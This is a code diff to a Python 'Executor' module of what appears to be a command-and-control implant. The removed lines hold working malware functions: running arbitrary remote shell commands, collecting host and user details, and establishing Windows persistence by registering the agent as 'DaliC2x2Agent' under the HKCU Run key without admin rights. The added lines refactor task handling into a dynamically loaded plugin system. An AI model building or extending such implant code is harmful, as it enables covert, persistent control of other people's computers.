@@ -1,77 +1,61 @@
-import subprocess
 import os
-import platform
 import sys
-from typing import Dict, Any
+import importlib
+import pkgutil
+from typing import Dict, Any, List
+try:
+    from .plugins.base import BasePlugin
+except ImportError:
+    from plugins.base import BasePlugin
 
 class Executor:
-    @staticmethod
-    def execute(task_type: str, payload: Dict[str, Any]) -> Dict[str, Any]:
-        """
-        Routes the task to the appropriate handler.
-        """
-        if task_type == "shell":
-            return Executor._shell_exec(payload.get("command", ""))
-        elif task_type == "sysinfo":
-            return Executor._get_sysinfo()
-        elif task_type == "persist":
-            return Executor._persist()
-        else:
-            return {"status": "error", "error": f"Unknown task type: {task_type}"}
+    _plugins: Dict[str, BasePlugin] = {}
 
-    @staticmethod
-    def _shell_exec(command: str) -> Dict[str, Any]:
-        try:
-            result = subprocess.run(
-                command,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            return {
-                "status": "success",
-                "stdout": result.stdout,
-                "stderr": result.stderr,
-                "exit_code": result.returncode
-            }
-        except subprocess.TimeoutExpired:
-            return {"status": "error", "error": "Command timed out"}
-        except Exception as e:
-            return {"status": "error", "error": str(e)}
-
-    @staticmethod
-    def _get_sysinfo() -> Dict[str, Any]:
-        try:
-            info = {
-                "os": platform.system(),
-                "os_version": platform.version(),
-                "machine": platform.machine(),
-                "processor": platform.processor(),
-                "cwd": os.getcwd(),
-                "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
-            }
-            return {"status": "success", "info": info}
-        except Exception as e:
-            return {"status": "error", "error": str(e)}
-
-    @staticmethod
-    def _persist() -> Dict[str, Any]:
-        if platform.system() != "Windows":
-            return {"status": "error", "error": "Persistence only implemented for Windows"}
+    @classmethod
+    def load_plugins(cls):
+        """Dynamically load all plugins from the plugins directory"""
+        cls._plugins = {}
         
-        try:
-            import winreg
-            # Get the path of the current executable
-            exe_path = os.path.abspath(sys.executable) if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        # Path to the plugins directory
+        plugins_path = os.path.join(os.path.dirname(__file__), "plugins")
+        
+        # Add to path so we can import
+        if plugins_path not in sys.path:
+            sys.path.append(plugins_path)
+
+        # Iterate over modules in the plugins directory
+        for _, name, is_pkg in pkgutil.iter_modules([plugins_path]):
+            if name == "base":
+                continue
             
-            # Use HKCU to avoid needing admin privileges
-            key = winreg.HKEY_CURRENT_USER
-            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            
-            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
-                winreg.SetValueEx(reg_key, "DaliC2x2Agent", 0, winreg.REG_SZ, exe_path)
-            
-            return {"status": "success", "output": f"Persistence established in Registry: {exe_path}"}
-        except Exception as e:
-            return {"status": "error", "error": f"Failed to establish persistence: {str(e)}"}
+            try:
+                module = importlib.import_module(f"agent.plugins.{name}")
+                # Look for classes that inherit from BasePlugin
+                for item_name in dir(module):
+                    item = getattr(module, item_name)
+                    if (isinstance(item, type) and 
+                        issubclass(item, BasePlugin) and 
+                        item is not BasePlugin):
+                        plugin_instance = item()
+                        cls._plugins[plugin_instance.name] = plugin_instance
+                        print(f"[*] Loaded plugin: {plugin_instance.name}")
+            except Exception as e:
+                print(f"[!] Failed to load plugin {name}: {e}")
+
+    @classmethod
+    def execute(cls, task_type: str, payload: Dict[str, Any]) -> Dict[str, Any]:
+        """Routes the task to the appropriate plugin."""
+        if not cls._plugins:
+            cls.load_plugins()
+
+        plugin = cls._plugins.get(task_type)
+        if plugin:
+            return plugin.execute(payload)
+        else:
+            return {"status": "error", "error": f"No plugin found for task type: {task_type}"}
+
+    @staticmethod
+    def _get_sysinfo():
+        # This is used for initial registration, we can reuse the plugin logic
+        from .plugins.sysinfo import SysinfoPlugin
+        return SysinfoPlugin().execute({})
